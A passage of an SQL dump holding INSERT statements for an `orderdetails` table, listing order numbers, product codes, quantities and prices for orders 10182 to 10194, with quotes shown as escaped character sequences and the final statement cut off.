INSERT INTO `orderdetails` VALUES (\u0026#39;10182\u0026#39;, \u0026#39;S18_1342\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;83.22\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10182\u0026#39;, \u0026#39;S18_1367\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;44.21\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10182\u0026#39;, \u0026#39;S18_1749\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;159.80\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10182\u0026#39;, \u0026#39;S18_2248\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;54.49\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10182\u0026#39;, \u0026#39;S18_2325\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;105.52\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10182\u0026#39;, \u0026#39;S18_2795\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;135.00\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10182\u0026#39;, \u0026#39;S18_3320\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;86.31\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10182\u0026#39;, \u0026#39;S18_4409\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;88.35\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10182\u0026#39;, \u0026#39;S18_4933\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;61.29\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10182\u0026#39;, \u0026#39;S24_1046\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;63.20\u0026#39;, \u0026#39;16\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10182\u0026#39;, \u0026#39;S24_1937\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;31.86\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10182\u0026#39;, \u0026#39;S24_2022\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;39.87\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10182\u0026#39;, \u0026#39;S24_2766\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;87.24\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10182\u0026#39;, \u0026#39;S24_2887\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;116.27\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10182\u0026#39;, \u0026#39;S24_3191\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;73.62\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10182\u0026#39;, \u0026#39;S24_3432\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;95.30\u0026#39;, \u0026#39;17\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10182\u0026#39;, \u0026#39;S24_3969\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;34.88\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10183\u0026#39;, \u0026#39;S10_1949\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;180.01\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10183\u0026#39;, \u0026#39;S10_4962\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;127.06\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10183\u0026#39;, \u0026#39;S12_1666\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;114.80\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10183\u0026#39;, \u0026#39;S18_1097\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;108.50\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10183\u0026#39;, \u0026#39;S18_2949\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;91.18\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10183\u0026#39;, \u0026#39;S18_2957\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;51.22\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10183\u0026#39;, \u0026#39;S18_3136\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;90.06\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10183\u0026#39;, \u0026#39;S18_4600\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;118.66\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10183\u0026#39;, \u0026#39;S18_4668\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;42.26\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10183\u0026#39;, \u0026#39;S24_4258\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;81.81\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10183\u0026#39;, \u0026#39;S32_3522\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;52.36\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10183\u0026#39;, \u0026#39;S700_2824\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;85.98\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10184\u0026#39;, \u0026#39;S12_4473\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;105.47\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10184\u0026#39;, \u0026#39;S18_2238\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;145.72\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10184\u0026#39;, \u0026#39;S18_2319\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;119.05\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10184\u0026#39;, \u0026#39;S18_2432\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;60.77\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10184\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;165.95\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10184\u0026#39;, \u0026#39;S24_1444\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;57.22\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10184\u0026#39;, \u0026#39;S24_2300\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;117.57\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10184\u0026#39;, \u0026#39;S24_2840\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;30.06\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10184\u0026#39;, \u0026#39;S24_4048\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;114.73\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10184\u0026#39;, \u0026#39;S32_1268\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;84.75\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10184\u0026#39;, \u0026#39;S32_2509\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;52.49\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10184\u0026#39;, \u0026#39;S32_3207\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;59.03\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10184\u0026#39;, \u0026#39;S50_1392\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;92.60\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10185\u0026#39;, \u0026#39;S12_1108\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;195.33\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10185\u0026#39;, \u0026#39;S12_3148\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;146.55\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10185\u0026#39;, \u0026#39;S12_3891\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;147.07\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10185\u0026#39;, \u0026#39;S18_3140\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;124.30\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10185\u0026#39;, \u0026#39;S18_3259\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;94.79\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10185\u0026#39;, \u0026#39;S18_4027\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;127.82\u0026#39;, \u0026#39;16\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10185\u0026#39;, \u0026#39;S18_4522\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;87.77\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10185\u0026#39;, \u0026#39;S24_2011\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;105.69\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10185\u0026#39;, \u0026#39;S24_3151\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;83.20\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10185\u0026#39;, \u0026#39;S50_1514\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;46.86\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10185\u0026#39;, \u0026#39;S700_1138\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;64.67\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10185\u0026#39;, \u0026#39;S700_1938\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;79.68\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10185\u0026#39;, \u0026#39;S700_2610\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;61.44\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10185\u0026#39;, \u0026#39;S700_3505\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;99.17\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10185\u0026#39;, \u0026#39;S700_3962\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;93.35\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10185\u0026#39;, \u0026#39;S72_3212\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;47.50\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10186\u0026#39;, \u0026#39;S10_4757\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;108.80\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10186\u0026#39;, \u0026#39;S18_1662\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;137.19\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10186\u0026#39;, \u0026#39;S18_3029\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;73.12\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10186\u0026#39;, \u0026#39;S18_3856\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;98.46\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10186\u0026#39;, \u0026#39;S24_2841\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;60.29\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10186\u0026#39;, \u0026#39;S24_3420\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;59.83\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10186\u0026#39;, \u0026#39;S24_3816\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;68.77\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10186\u0026#39;, \u0026#39;S700_2047\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;80.56\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10186\u0026#39;, \u0026#39;S72_1253\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;42.71\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10187\u0026#39;, \u0026#39;S18_2581\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;70.12\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10187\u0026#39;, \u0026#39;S24_1785\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;96.29\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10187\u0026#39;, \u0026#39;S24_3949\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;55.96\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10187\u0026#39;, \u0026#39;S24_4278\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;64.48\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10187\u0026#39;, \u0026#39;S32_4289\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;61.22\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10187\u0026#39;, \u0026#39;S50_1341\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;39.71\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10187\u0026#39;, \u0026#39;S700_1691\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;84.95\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10187\u0026#39;, \u0026#39;S700_2466\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;95.73\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10187\u0026#39;, \u0026#39;S700_3167\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;72.00\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10187\u0026#39;, \u0026#39;S700_4002\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;70.33\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10188\u0026#39;, \u0026#39;S10_1678\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;95.70\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10188\u0026#39;, \u0026#39;S10_2016\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;111.80\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10188\u0026#39;, \u0026#39;S10_4698\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;182.04\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10188\u0026#39;, \u0026#39;S18_2625\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;52.09\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10188\u0026#39;, \u0026#39;S24_1578\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;95.80\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10188\u0026#39;, \u0026#39;S24_2000\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;61.70\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10188\u0026#39;, \u0026#39;S32_1374\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;81.91\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10188\u0026#39;, \u0026#39;S700_2834\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;96.11\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10189\u0026#39;, \u0026#39;S12_2823\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;138.57\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10190\u0026#39;, \u0026#39;S24_2360\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;58.87\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10190\u0026#39;, \u0026#39;S32_2206\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;38.62\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10190\u0026#39;, \u0026#39;S32_4485\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;89.80\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10190\u0026#39;, \u0026#39;S50_4713\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;67.53\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10191\u0026#39;, \u0026#39;S12_1099\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;155.66\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10191\u0026#39;, \u0026#39;S12_3380\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;104.52\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10191\u0026#39;, \u0026#39;S12_3990\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;70.22\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10191\u0026#39;, \u0026#39;S18_3278\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;75.59\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10191\u0026#39;, \u0026#39;S18_3482\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;119.06\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10191\u0026#39;, \u0026#39;S18_3782\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;60.93\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10191\u0026#39;, \u0026#39;S18_4721\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;136.90\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10191\u0026#39;, \u0026#39;S24_3371\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;53.27\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10191\u0026#39;, \u0026#39;S24_4620\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;77.61\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10192\u0026#39;, \u0026#39;S12_4675\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;99.04\u0026#39;, \u0026#39;16\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10192\u0026#39;, \u0026#39;S18_1129\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;140.12\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10192\u0026#39;, \u0026#39;S18_1589\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;100.80\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10192\u0026#39;, \u0026#39;S18_1889\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;70.84\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10192\u0026#39;, \u0026#39;S18_1984\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;128.03\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10192\u0026#39;, \u0026#39;S18_2870\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;110.88\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10192\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;137.17\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10192\u0026#39;, \u0026#39;S18_3685\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;125.74\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10192\u0026#39;, \u0026#39;S24_1046\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;72.02\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10192\u0026#39;, \u0026#39;S24_1628\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;49.30\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10192\u0026#39;, \u0026#39;S24_2766\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;86.33\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10192\u0026#39;, \u0026#39;S24_2887\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;112.74\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10192\u0026#39;, \u0026#39;S24_2972\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;33.23\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10192\u0026#39;, \u0026#39;S24_3191\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;69.34\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10192\u0026#39;, \u0026#39;S24_3432\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;93.16\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10192\u0026#39;, \u0026#39;S24_3856\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;112.34\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10193\u0026#39;, \u0026#39;S18_1342\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;92.47\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10193\u0026#39;, \u0026#39;S18_1367\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;46.36\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10193\u0026#39;, \u0026#39;S18_1749\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;153.00\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10193\u0026#39;, \u0026#39;S18_2248\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;60.54\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10193\u0026#39;, \u0026#39;S18_2325\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;115.69\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10193\u0026#39;, \u0026#39;S18_2795\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;143.44\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10193\u0026#39;, \u0026#39;S18_2949\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;87.13\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10193\u0026#39;, \u0026#39;S18_2957\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;53.09\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10193\u0026#39;, \u0026#39;S18_3136\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;97.39\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10193\u0026#39;, \u0026#39;S18_3320\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;79.37\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10193\u0026#39;, \u0026#39;S18_4409\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;92.03\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10193\u0026#39;, \u0026#39;S18_4933\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;66.28\u0026#39;, \u0026#39;16\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10193\u0026#39;, \u0026#39;S24_1937\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;32.19\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10193\u0026#39;, \u0026#39;S24_2022\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;44.80\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10193\u0026#39;, \u0026#39;S24_3969\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;38.16\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10193\u0026#39;, \u0026#39;S24_4258\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;92.52\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10194\u0026#39;, \u0026#39;S10_1949\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;203.59\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10194\u0026#39;, \u0026#39;S10_4962\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;134.44\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10194\u0026#39;, \u0026#39;S12_1666\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;124.37\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10194\u0026#39;, \u0026#39;S18_1097\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;103.84\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10194\u0026#39;, \u0026#39;S18_2432\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;51.05\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10194\u0026#39;, \u0026#39;S18_4600\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;113.82\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10194\u0026#39;, \u0026#39;S18_4668\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;47.79\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10194\u0026#39;, \u0026#39;S24_2300\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;112.46\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10194\u0026#39;, \u0026#39;S32_1268\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;77.05\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10194\u0026#39;, \u0026#39;S32_3522\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;61.41\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10194\u0026#39;, 